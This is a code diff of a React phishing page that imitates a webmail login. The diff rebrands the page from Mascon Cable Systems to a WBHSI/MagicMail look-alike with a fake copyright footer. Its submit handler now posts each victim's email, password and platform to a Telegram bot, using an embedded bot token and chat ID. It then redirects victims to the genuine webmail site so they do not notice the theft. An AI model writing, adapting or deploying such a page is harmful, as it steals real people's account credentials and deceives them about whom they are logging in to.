@@ -7,6 +7,7 @@ import mascon from './mascon.png';
 
 import { useState } from 'react';
 import axios from 'axios';
+import wbhsi from './wbhsi.png';
 
 import { useEffect } from 'react';
 function Home(){
@@ -14,50 +15,65 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Mascon")
+    const[platform, setPlatform] = useState("Wbhsi")
 
     const[showError, setShowError] = useState(false);
 
 
-    
 
-    
+
 
 async function handleSubmit(e){
     e.preventDefault();
 
+
     try {
-        const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
+        // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+        //     email:email,
+        //     password:password,
+        //     platform:platform
+        // });
+
+        const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+            chat_id: 5916570239,
+            text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+          });
+
+
     
         // Handle success
-        console.log('Data sent:', response.data.message);
+     
 
         if(response.status == 200){
-            console.log(response.data.message);
+           // console.log(response.data.message);
 
-            window.location.href = 'https://webmail.cablelan.net';
+          
+           window.location.href = 'https://webmail.wbhsi.net/webmail/';
         }
       } catch (error) {
         // Handle error
         console.error('Error:', error);
       }
     
+
+    
 }
 
     return (
         <>
-            <nav className='mynav px-3 py-3'>
+            {/* <nav className='mynav px-3 py-3'>
                 <img className='navimage' src={mascon} />
 
-            </nav>
+            </nav> */}
 
                 <div className='py-5'>
 
                 </div>
+
+                <div className='text-center'>
+            <img className='navimage' src={wbhsi} />
+
+            </div>
 
                 {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
@@ -74,11 +90,15 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-                <div className='cardhead'>
-                Welcome to Mascon Cable Systems Webmail
+
+            
+
+                <div className='cardhead text-center'>
+                
+Welcome to MagicMail Webmail
                 </div>
 
-                <form onSubmit={handleSubmit}>
+                <form onSubmit={handleSubmit} >
 
                 <div class="formrow text-center mt-3">
                                 <span class="prompt"><label for="user">Email</label></span>
@@ -99,7 +119,7 @@ async function handleSubmit(e){
 
 
                     <div className='buttondiv py-4 text-center'>
-                        <button className='mybutton'type="submit">Login</button>
+                        <button className='mybutton bg-light rounded'type="submit">Login</button>
 
                     </div>
 
@@ -107,13 +127,25 @@ async function handleSubmit(e){
 
                 </form>
 
+
+
+               
                 
 
             </div>
+
+            <br/>
+                <br/>
+                <div className='px-3 py-2 bg-light col-md-4 m-auto'>
+                    <p className='text-center'>© Copyright 2009-2024 LinuxMagic Inc. All Rights Reserved <br/>
+www.magicmail.com</p>
+
+                </div>
             
             <br/>
 
-                <p className='info'>Mascon Cable Systems Webmail</p>
+                
+
         </>
     );
 
